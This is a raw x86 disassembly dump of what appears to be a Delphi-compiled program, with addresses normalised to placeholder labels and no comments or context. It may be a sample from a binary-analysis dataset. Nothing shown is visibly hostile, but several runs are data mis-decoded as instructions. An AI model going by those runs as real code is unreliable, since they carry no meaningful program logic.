mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov eax [ eax + 0x1c ]
retn
jo r-xdata
cmp cl [ ecx ]
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov eax 0x80004002
xor eax eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85d92
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
inc ebx
xor esi esi
pop ebx
pop ebp
retn 0xc
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_3a66cf8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_3a84ff3
add eax 0xffffffd8
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a85d8b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_3a652f4
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85d92
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_3a66cf8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_3a85052
mov ch 0x4f
test al 0x3
mov edi 0xc903a84f
dec edi
test al 0x3
popfd
dec edi
test al 0x3
movsd [ edi ] [ esi ]
dec edi
test al 0x3
lodsd [ esi ]
dec edi
test al 0x3
or edx [ eax - 0x58 ]
add edx [ 0x1f03a850 ]
push eax
test al 0x3
fisttp [ edi - 0x58 ]
add esp ebx
dec edi
test al 0x3
jmp r-xdata
movsd [ edi ] [ esi ]
leave
aam 0x6a
push eax
test al 0x3
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebp
push eax
test al 0x3
sub [ eax - 0x58 ] edx
add eax [ eax + eax ]
add [ eax ] al
add eax 0xa6b0cdb
retn
cmp ch [ edx + 0x50 ]
test al 0x3
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl ch
stc
dec esp
and [ ebp - 0x4146bfbb ] bh
pop ds
and edi [ edx - 0x6da3ccef ]
push eax
test al 0x3
sub al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
push ecx
test al 0x3
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
dec esi
test al 0x3
add al 0x0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
popad
outsb
popad
jb r-xdata
call sub_3a66ccc
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
clc
inc edi
mov al 0x3
jns r-xdata
mov [ 0x3a850 ] al
add [ eax ] al
add [ ecx + edx * 2 - 0x58 ] ah
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x51 ] bh
test al 0x3
xor [ eax ] al
add [ eax ] al
mov ah 0x11
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edi [ eax ]
push ebx
test al 0x3
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 2 - 0x58 ] dl
add ecx [ eax + eax ]
add [ eax ] al
xchg esp eax
adc [ esi + 0x2003 ] ah
add [ esp + edx * 2 ] cl
dec eax
insb
jo r-xdata
fcom [ ecx - 0x58 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push ecx
test al 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0xc03a851 0x0
inc [ eax ]
add al bh
inc edi
mov al 0x3
jpe r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jpo r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jl r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jge r-xdata
add [ eax ] al
clc
inc [ eax ]
add [ ebx - 0x4f9607c3 ] al
add eax [ eax ]
jne r-xdata
add [ eax ] al
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a852d4
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
sub edx 0xffffffdc
sub_3a85080
test al 0x3
dec edi
test al 0x3
sti
dec edi
test al 0x3
add edx [ eax - 0x58 ]
add edx ebx
dec edi
test al 0x3
xor [ eax - 0x58 ] edx
add edi [ ebx ]
push eax
test al 0x3
inc ebp
push eax
test al 0x3
sub [ eax - 0x58 ] edx
add eax [ eax + eax ]
add [ eax ] al
add eax 0xa6b0cdb
retn
sub_3a851b3
add al al
adc [ esi - 0x59ba37fd ] ah
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
dec esi
test al 0x3
add al 0x0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
call sub_3a66ccc
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
clc
inc edi
mov al 0x3
jns r-xdata
inc [ eax ]
add al bh
inc edi
mov al 0x3
jpe r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jpo r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jl r-xdata
add [ eax ] al
clc
inc [ eax ]
add al bh
inc edi
mov al 0x3
jge r-xdata
add [ eax ] al
clc
inc [ eax ]
add [ ebx - 0x4f9607c3 ] al
add eax [ eax ]
jne r-xdata
add [ eax ] al
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a852d4
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
sub edx 0xffffffdc
sub_3a85250
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
call sub_3a85224
mov eax ebx
mov edx [ rw-data ]
mov ecx r-xdata
call sub_3a66cf8
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
xor eax eax
mov [ ebx ] eax
sub_3a85290
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
lea eax [ edi + 0x4 ]
mov edx esi
call sub_3a66ccc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a852d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x20 ]
call sub_3a652a0
mov [ esi + 0x18 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a85338
push ebx
push esi
push edi
push ebp
call sub_3a6478c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc edi
mov eax [ ebp + 0x14 ]
call sub_3a64380
mov eax [ ebp + 0x10 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_3a64370
test bl bl
jle r-xdata
lea eax [ ebp + 0xc ]
call sub_3a66cb4
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_3a7a494
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax esi
call sub_3a64380
dec edi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
sub_3a853b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a85450
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a85290
mov esi eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_3a7a33c
mov edx [ ebx + 0x18 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_3a6efcc
test al al
je r-xdata
inc [ ebx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
test edx edx
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_3a7a33c
mov ecx r-xdata
call sub_3a66cf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85457
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub edx 0xfffffff8
sub_3a85480
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_3a7a494
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_3a854b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a85608
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a855bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jne r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
jmp r-xdata
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a855c4
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
sub_3a855c4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8560f
lea eax [ ebp - 0x14 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a85618
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a856bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
lea eax [ edi + 0x20 ]
mov edx [ ebp - 0xc ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a856c3
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edx esi
call sub_3a7a494
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
pop eax
call sub_3a6efcc
test al al
je r-xdata
sub_3a856e0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a85977
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8597e
lea eax [ ebp - 0x30 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_3a85952
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
dec eax
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_3a65730
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_3a7a33c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_3a85935
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_3a7a494
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_3a64380
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
xor edx edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
xor eax eax
push ebp
push sub_3a8589a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_3a64380
retn
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_3a64380
retn
inc esi
mov [ ebp - 0x14 ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub_3a85988
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a859fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x8 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85a03
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
sub_3a85a1c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a85c95
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x20
mov edx [ ebp - 0x18 ]
call sub_3a652f4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc ebx
xor esi esi
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a85988
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xc ]
call sub_3a66ccc
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a85988
pop ecx
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_3a66cf8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85c9c
lea eax [ ebp - 0x34 ]
call sub_3a66cb4
lea eax [ ebp - 0x30 ]
call sub_3a652a0
lea eax [ ebp - 0x2c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_3a65e38
lea eax [ ebp - 0x10 ]
call sub_3a66cb4
lea eax [ ebp - 0xc ]
call sub_3a66cb4
retn
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a85988
pop ecx
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_3a85c31
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
inc ebx
xor esi esi
push ebp
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_3a85988
pop ecx
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_3a7a494
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov ecx r-xdata
call sub_3a66cf8
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_3a85cc8
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a85d8b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_3a652f4
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a85d92
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_3a7a494
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_3a66ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_3a66cf8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_3a85df8
